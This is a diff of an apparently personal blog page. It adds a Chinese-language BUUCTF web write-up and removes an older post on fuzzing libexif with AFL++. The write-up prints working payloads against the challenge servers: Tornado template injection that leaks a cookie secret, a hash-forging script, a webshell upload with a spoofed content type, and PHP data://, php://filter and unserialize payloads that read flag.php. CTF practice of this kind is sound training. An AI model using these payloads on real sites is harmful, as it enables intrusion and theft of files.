@@ -73,6 +73,142 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-Buuctf Web（21-24）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/08/11/Buuctf%20Web%EF%BC%8821-24%EF%BC%89/" class="article-date">
+  <time class="dt-published" datetime="2023-08-11T11:44:06.000Z" itemprop="datePublished">2023-08-11</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/08/11/Buuctf%20Web%EF%BC%8821-24%EF%BC%89/">Buuctf Web（21-24）</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h3 id="Buuctf-Web（21-24）"><a href="#Buuctf-Web（21-24）" class="headerlink" title="Buuctf Web（21-24）"></a>Buuctf Web（21-24）</h3><h4 id="21、easy-tornado"><a href="#21、easy-tornado" class="headerlink" title="21、easy_tornado"></a>21、easy_tornado</h4><p>题目首页有三个链接，首先查看&#x2F;flag.txt，可以看到flag在&#x2F;fllllllllllllag中</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8124ed8c-6dfb-4f89-b050-8a841a4e56b2" alt="image"></p>
+<p>查看&#x2F;fllllllllllllag，显示Error</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9a24200a-c33a-4ec5-b86a-0f598b975988" alt="image"></p>
+<p>并且url变成了&#x2F;error?msg&#x3D;Error</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/bb555e51-15cf-4a34-ab56-50f0446c84f2" alt="image"></p>
+<p>查看&#x2F;welcome.txt，内容为render</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1b813424-aff6-4218-b808-4b0d4b8d3426" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 ，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过&#123;&#123;&#125;&#125;进行传递变量和执行简单的表达式。</span><br><span class="line">Tornado是一种 Web 服务器软件的开源版本。Tornado 和现在的主流 Web 服务器框架（包括大多数 Python 的框架）有着明显的区别：它是非阻塞式服务器，而且速度相当快。</span><br></pre></td></tr></table></figure>
+
+<p>查看&#x2F;hints.txt，这是一个加密方法，猜测 要构造<code>filename=/fllllllllllllag&amp;filehash=？</code></p>
+<p><img src="C:\Users\15646\AppData\Roaming\Typora\typora-user-images\image-20230812150637958.png" alt="image-20230812150637958"></p>
+<p>在查阅资料后发现Error就是注入点</p>
+<p>本题是模板注入<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/aef2ae0498df">SSTI模板注入 - 简书 (jianshu.com)</a></p>
+<p>参考资料<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bwangel23/p/4858870.html">Tornado小记 – 模板中的Handler - 黑翼天使23 - 博客园 (cnblogs.com)</a></p>
+<p>获取handler.settings环境变量：<code>/error?msg=&#123;&#123;handler.settings&#125;&#125;</code></p>
+<p>得到cookie_secret</p>
+<p><code>&#39;cookie_secret&#39;: &#39;caffff81-323f-48da-8323-dc1530a0c95d&#39;</code></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/32f7ab16-b8c5-4a51-acb3-1c4202250294" alt="image"></p>
+<p>编写脚本</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">def Md5(x):</span><br><span class="line">    md5 = hashlib.md5(str(x).encode(&quot;utf8&quot;)).hexdigest()</span><br><span class="line">    return md5</span><br><span class="line">    </span><br><span class="line">print(Md5(&quot;caffff81-323f-48da-8323-dc1530a0c95d&quot;+Md5(&quot;/fllllllllllllag&quot;)))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/a033cbb8-a253-4db8-bf82-8ddf811a549c" alt="image"></p>
+<p>构造<code>/file?filename=/fllllllllllllag&amp;filehash=7d14388e78d85a8f1e726052e9d4dfbd</code></p>
+<p>得到flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/2f83150e-3dd7-4d3a-89b2-1b63b92c9691" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5673c2e4-27f7-4962-8d87-f449b8069952&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="22、admin"><a href="#22、admin" class="headerlink" title="22、admin"></a>22、admin</h4><p>注册一个账号</p>
+<p>由于题目叫admin，所以注册时直接用admin了</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d1074fae-9dc5-476a-a188-aac12ef08226" alt="image"></p>
+<p>显示用户名已经被注册过</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b73df34a-1a5b-4f00-b869-c72281dd2abb" alt="image"></p>
+<p>注册一个账号</p>
+<p>由于题目叫admin，所以注册时直接用admin了</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d1074fae-9dc5-476a-a188-aac12ef08226" alt="image"></p>
+<p>显示用户名已经被注册过</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b73df34a-1a5b-4f00-b869-c72281dd2abb" alt="image"></p>
+<p>猜密码</p>
+<p>用123登陆成功了。。。</p>
+<p><img src="C:\Users\15646\AppData\Roaming\Typora\typora-user-images\image-20230812171109196.png" alt="image-20230812171109196"></p>
+<p>在网上看大佬解题思路</p>
+<p>注册</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0dc1b0d0-bc52-4352-a081-27b2a6b5f2f7" alt="image"></p>
+<p>登录，右侧依次查看</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d87e4454-5a16-4fea-9512-9bef90f01a9c" alt="image"></p>
+<p>在change password的源代码中看到一个被注释的链接</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/bc16f3dc-36de-4130-885a-8334541c24ee" alt="image"></p>
+<p>访问这个链接，内容已被删除，所以就没再看了</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b1fe4d77-4ed1-4c7b-a261-dbf716519595" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;88c07276-46ea-4e23-a50d-ce722b067e0f&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="23、你传你🐎呢"><a href="#23、你传你🐎呢" class="headerlink" title="23、你传你🐎呢"></a>23、你传你🐎呢</h4><p>查看大佬的博客后，了解到，该题需要上传两个文件</p>
+<p>一、<code>.htaccess</code>文件，用来改变文件扩展名</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/546f346f-4cc2-4387-99b5-e4f679a198c6" alt="image"></p>
+<p>上传该文件，抓包，修改Content-Type:image&#x2F;png，send</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/eb0d84c7-11ba-4569-86ce-2d852e01f523" alt="image"></p>
+<p>二、木马文件，用来连接蚁剑</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/e02853bf-cf0e-4480-a249-a94d1e290c97" alt="image"></p>
+<p>改名为a.png，上传，抓包，修改Content-Type:image&#x2F;png，send</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8647b067-6164-4385-a7a1-3d27b8eb1697" alt="image"></p>
+<p>用蚁剑连接</p>
+<p>URL：<code>http://f532922c-3101-4cac-ad67-3e8b27c936fe.node4.buuoj.cn:81/upload/535c8c0c4ab4ecda962a1a3922bee31d/a.png</code></p>
+<p>密码：<code>a</code></p>
+<p>没测试成功，试了很久没写出来，留着以后看</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="24、NiZhuanSiWei"><a href="#24、NiZhuanSiWei" class="headerlink" title="24、NiZhuanSiWei"></a>24、NiZhuanSiWei</h4><p>从题目的php代码中可以知道需要用get方式传三个参数，text，file，password</p>
+<p>有一个php文件</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/2ed62ae4-cebd-49e4-9fff-62144ce580d8" alt="image"></p>
+<p>访问该文件，什么都没有</p>
+<p>有一行代码说我们要传入一个文件，内容是”welcome to the zjctf”</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7acb96ce-aecd-4d57-813d-096ae3ddf798" alt="image"></p>
+<p>要用到data协议，data协议通常是用来执行PHP代码，也可以将内容写入data协议中，然后让file_get_contents函数取读取。构造：<code>data://text/plain,welcome to the zjctf</code></p>
+<p>为了绕过一些过滤，用base64编码构造payload：<code>/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/22b156d1-ff92-4112-a963-03edd63872d5" alt="image"></p>
+<p>有一个可控参数file，构造file&#x3D;useless.php，但是针对php文件我们需要进行base64编码，否则读取不到其内容，所以构造payload：<code>/?file=php://filter/read=convert.base64-encode/resource=useless.php</code></p>
+<p>完整payload：<code>/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></p>
+<p>得到一串base64编码</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/bd421ff2-86f8-48fc-8536-ba0c204a473a" alt="image"></p>
+<p>解码</p>
+<p>得到useless.php源码</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ff8cc374-6ccb-426b-8372-707bdb01642a" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>
+
+<p>有一个 flag.php ,并且file不为空将读取flag.php并显示。所以。构造一个序列化字符串</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file=flag.php;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$a = new Flag();</span><br><span class="line">$a-&gt;file=&quot;flag.php&quot;;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
+
+<p>找个在<a target="_blank" rel="noopener" href="https://c.runoob.com/compile/1">线运行PHP</a>的网站，得到</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/750e7fdf-d5d6-4c19-a5eb-19b42d5f7b33" alt="image"></p>
+<p>构造payload：<code>/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9ebb7fdd-ca59-4728-bf1d-30e878e931e2" alt="image"></p>
+<p>查看源代码，得到flag</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/64288a23-13c1-4116-8574-dba7738b1408" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6cb4bd76-2b5f-4876-9fe0-46f02e2d0062&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/08/11/Buuctf%20Web%EF%BC%8821-24%EF%BC%89/" data-id="cll80vdpg000030vfe67z1lar" data-title="Buuctf Web（21-24）" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-Buuctf Web（17-20）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2023/08/10/Buuctf%20Web%EF%BC%8817-20%EF%BC%89/" class="article-date">
@@ -1174,142 +1310,6 @@
 
 
   
-    <article id="post-Exercise 2 - libexif" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/07/27/Exercise%202%20-%20libexif/" class="article-date">
-  <time class="dt-published" datetime="2023-07-27T15:32:15.000Z" itemprop="datePublished">2023-07-27</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/07/27/Exercise%202%20-%20libexif/">Exercise 2 - libexif</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h3 id="Exercise-2-libexif"><a href="#Exercise-2-libexif" class="headerlink" title="Exercise 2 - libexif"></a>Exercise 2 - libexif</h3><h4 id="一、实验背景"><a href="#一、实验背景" class="headerlink" title="一、实验背景"></a>一、实验背景</h4><p><strong>CVE-2009-3895</strong>是一个基于堆的缓冲区溢出，可以通过无效的EXIF图像触发。基于堆的缓冲区溢出是发生在堆数据区域的一种缓冲区溢出，它通常与显式动态内存管理(使用malloc()和free()函数进行分配&#x2F;回收)有关。因此，远程攻击者可以利用此问题在使用受影响库的应用程序上下文中执行任意代码。</p>
-<p>基于堆的缓冲区溢出漏洞（<a target="_blank" rel="noopener" href="https://cwe.mitre.org/data/definitions/122.html%EF%BC%89">https://cwe.mitre.org/data/definitions/122.html）</a></p>
-<p><strong>CVE-2012-2836</strong>是一个越界读取漏洞，可以通过带有精心制作的EXIF标签的图像触发。越界读取是当程序读取数据超过预期缓冲区的末尾或开始之前时发生的漏洞。因此，它允许远程攻击者导致拒绝服务或可能从进程内存中获取潜在的敏感信息。</p>
-<p>越界读取漏洞（<a target="_blank" rel="noopener" href="https://cwe.mitre.org/data/definitions/125.html%EF%BC%89">https://cwe.mitre.org/data/definitions/125.html）</a></p>
-<h4 id="二、实验目的"><a href="#二、实验目的" class="headerlink" title="二、实验目的"></a>二、实验目的</h4><p>这次我们将模糊<strong>libexif</strong> EXIF解析库。目标是在libxif 0.6.14中找到<a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3895"><strong>CVE-2009-3895</strong></a>和<a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2836"><strong>CVE-2012-2836</strong></a>的崩溃&#x2F;PoC。</p>
-<h4 id="三、实验环境："><a href="#三、实验环境：" class="headerlink" title="三、实验环境："></a>三、实验环境：</h4><p>win10，VMware，Ubuntu 20.04.2 LTS（虚拟机用户名密码均为fuzz）</p>
-<h4 id="四、实验步骤"><a href="#四、实验步骤" class="headerlink" title="四、实验步骤"></a>四、实验步骤</h4><h5 id="1、下载并构建目标"><a href="#1、下载并构建目标" class="headerlink" title="1、下载并构建目标"></a>1、下载并构建目标</h5><p>为模糊的项目创建一个新目录</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME</span><br><span class="line">mkdir fuzzing_libexif &amp;&amp; cd fuzzing_libexif/</span><br></pre></td></tr></table></figure>
-
-<p>下载并解压libexif-0.6.14</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/libexif/libexif/archive/refs/tags/libexif-0_6_14-release.tar.gz</span><br><span class="line">tar -xzvf libexif-0_6_14-release.tar.gz</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6543f29e-5e52-4ed6-999c-597161314a56" alt="image"></p>
-<p>构建并安装libexif</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd libexif-libexif-0_6_14-release/</span><br><span class="line">sudo apt-get install autopoint libtool gettext libpopt-dev</span><br><span class="line">autoreconf -fvi</span><br><span class="line">./configure --enable-shared=no --prefix=&quot;$HOME/fuzzing_libexif/install/&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/5e1c7727-dce4-41eb-95dc-bff5012fb3ff" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/83e655dd-f4d6-47ea-94df-31c9d62dba34" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/974d2755-eeb5-4ae1-b5b1-3cc5fc523a92" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7c84d35d-8784-486c-b206-e7e8a9e53568" alt="image"></p>
-<p><img src="C:\Users\15646\AppData\Roaming\Typora\typora-user-images\image-20230727232107643.png" alt="image-20230727232107643"></p>
-<h5 id="2、选择一个接口应用程序"><a href="#2、选择一个接口应用程序" class="headerlink" title="2、选择一个接口应用程序"></a>2、选择一个接口应用程序</h5><p>libexif是一个库，我们需要另一个应用程序来使用这个库，这个应用程序将被模糊化。对于这个任务，我们将使用<strong>exif command-line</strong>，下载并解压exif command-line 0.6.15:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME/fuzzing_libexif</span><br><span class="line">wget https://github.com/libexif/exif/archive/refs/tags/exif-0_6_15-release.tar.gz</span><br><span class="line">tar -xzvf exif-0_6_15-release.tar.gz</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/473d3e7e-3ab3-4ae1-9c98-5640bddcaa2c" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/10a19b33-857d-4b49-8d17-efb4e7254066" alt="image"></p>
-<p>构建并安装exif command-line实用程序</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd exif-exif-0_6_15-release/</span><br><span class="line">autoreconf -fvi</span><br><span class="line">./configure --enable-shared=no --prefix=&quot;$HOME/fuzzing_libexif/install/&quot; PKG_CONFIG_PATH=$HOME/fuzzing_libexif/install/lib/pkgconfig</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/2971a8cb-5f5a-40d6-9af5-5b99c740b55a" alt="image"></p>
-<p><img src="C:\Users\15646\AppData\Roaming\Typora\typora-user-images\image-20230727232415273.png" alt="image-20230727232415273"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b3fd1cbf-249c-4a2d-b601-f4193f815c12" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f0807bd9-9ea0-49b5-9481-683f38202257" alt="image"></p>
-<p>测试是否正常工作</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$HOME/fuzzing_libexif/install/bin/exif</span><br></pre></td></tr></table></figure>
-
-<p>看到如下页面说明工作正常</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3f53db47-04ea-461c-8c9e-859ffd12f4da" alt="image"></p>
-<h5 id="3、创建种子语料库"><a href="#3、创建种子语料库" class="headerlink" title="3、创建种子语料库"></a>3、创建种子语料库</h5><p>现在我们需要一些出口样本。我们将使用以下repo中的样例图像:<a target="_blank" rel="noopener" href="https://github.com/ianare/exif-samples%E3%80%82%E9%80%9A%E8%BF%87%E4%BB%A5%E4%B8%8B%E6%8C%87%E4%BB%A4%E4%B8%8B%E8%BD%BD">https://github.com/ianare/exif-samples。通过以下指令下载</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME/fuzzing_libexif</span><br><span class="line">wget https://github.com/ianare/exif-samples/archive/refs/heads/master.zip</span><br><span class="line">unzip master.zip</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7453ee21-bca8-4d98-9f25-350141d0e7f3" alt="image"></p>
-<p>举例</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$HOME/fuzzing_libexif/install/bin/exif $HOME/fuzzing_libexif/exif-samples-master/jpg/Canon_40D_photoshop_import.jpg</span><br></pre></td></tr></table></figure>
-
-<p>可以看到如下输出</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3a12071e-4332-4383-9d85-1612dbc00b38" alt="image"></p>
-<h5 id="4、Afl-clang-lto"><a href="#4、Afl-clang-lto" class="headerlink" title="4、Afl-clang-lto"></a>4、Afl-clang-lto</h5><p>使用<strong>afl-clang-lto</strong>作为编译器来构建libexif。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rm -r $HOME/fuzzing_libexif/install</span><br><span class="line">cd $HOME/fuzzing_libexif/libexif-libexif-0_6_14-release/</span><br><span class="line">make clean</span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">CC=afl-clang-lto ./configure --enable-shared=no --prefix=&quot;$HOME/fuzzing_libexif/install/&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME/fuzzing_libexif/exif-exif-0_6_15-release</span><br><span class="line">make clean</span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">CC=afl-clang-lto ./configure --enable-shared=no --prefix=&quot;$HOME/fuzzing_libexif/install/&quot; PKG_CONFIG_PATH=$HOME/fuzzing_libexif/install/lib/pkgconfig</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/110ef19c-eaf2-45bd-a3db-de5b980cc57a" alt="image"></p>
-<p><img src="C:\Users\15646\AppData\Roaming\Typora\typora-user-images\image-20230727233607562.png" alt="image-20230727233607562"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6e6e8f30-0b1e-4603-94d4-65139cd9fede" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c58fa0c8-927b-4c29-bd92-ec842081e184" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/412bb374-a138-4d29-b912-96ebfc9bae38" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/fbdc3cb0-7f3f-4f5a-b68e-44ce3cea911e" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d79bf6e4-f593-49d0-95fb-efd4fc1a2c39" alt="image"></p>
-<p><img src="C:\Users\15646\AppData\Roaming\Typora\typora-user-images\image-20230727233940330.png" alt="image-20230727233940330"></p>
-<p>使用了<strong>afl-clang-lto</strong>而不是<strong>afl-clang-fast</strong>。一般来说，<strong>afl-clang-lto</strong>是最好的选择，因为它是一个无冲突的工具，而且它比<strong>afl-clang-fast</strong>快。</p>
-<p>如果不确定何时使用<strong>afl-clang-lto</strong>或<strong>afl-clang-fast</strong>，可以检查从[AFLplusplus:检测目标]提取的下图(<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus#1-instrumenting-that-target">https://github.com/AFLplusplus/AFLplusplus#1-instrumenting-that-target</a>)</p>
-<p>](<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus#1-instrumenting-that-target">https://github.com/AFLplusplus/AFLplusplus#1-instrumenting-that-target</a>)</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">+--------------------------------+</span><br><span class="line">| clang/clang++ 11+ is available | --&gt; use LTO mode (afl-clang-lto/afl-clang-lto++)</span><br><span class="line">+--------------------------------+     see [instrumentation/README.lto.md](instrumentation/README.lto.md)</span><br><span class="line">    |</span><br><span class="line">    | if not, or if the target fails with LTO afl-clang-lto/++</span><br><span class="line">    |</span><br><span class="line">    v</span><br><span class="line">+---------------------------------+</span><br><span class="line">| clang/clang++ 6.0+ is available | --&gt; use LLVM mode (afl-clang-fast/afl-clang-fast++)</span><br><span class="line">+---------------------------------+     see [instrumentation/README.llvm.md](instrumentation/README.llvm.md)</span><br><span class="line">    |</span><br><span class="line">    | if not, or if the target fails with LLVM afl-clang-fast/++</span><br><span class="line">    |</span><br><span class="line">    v</span><br><span class="line"> +--------------------------------+</span><br><span class="line"> | gcc 5+ is available            | -&gt; use GCC_PLUGIN mode (afl-gcc-fast/afl-g++-fast)</span><br><span class="line"> +--------------------------------+    see [instrumentation/README.gcc_plugin.md](instrumentation/README.gcc_plugin.md) and</span><br><span class="line">                                       [instrumentation/README.instrument_list.md](instrumentation/README.instrument_list.md)</span><br><span class="line">    |</span><br><span class="line">    | if not, or if you do not have a gcc with plugin support</span><br><span class="line">    |</span><br><span class="line">    v</span><br><span class="line">   use GCC mode (afl-gcc/afl-g++) (or afl-clang/afl-clang++ for clang)</span><br></pre></td></tr></table></figure>
-
-<h4 id="5、fuzzing"><a href="#5、fuzzing" class="headerlink" title="5、fuzzing"></a>5、fuzzing</h4><p>使用以下命令运行fuzzer</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i $HOME/fuzzing_libexif/exif-samples-master/jpg/ -o $HOME/fuzzing_libexif/out/ -s 123 -- $HOME/fuzzing_libexif/install/bin/exif @@</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/78f8b744-54ce-4d0c-b39d-819491dfad7d" alt="image"></p>
-<p>几分钟后可以看见有多个崩溃</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b67623b8-6a50-4130-9ecc-3605eb0c0f83" alt="image"></p>
-<p>可以在这里找到崩溃的图像文件</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6920c7f3-ef27-450d-bc94-8a719b8cfd51" alt="image"></p>
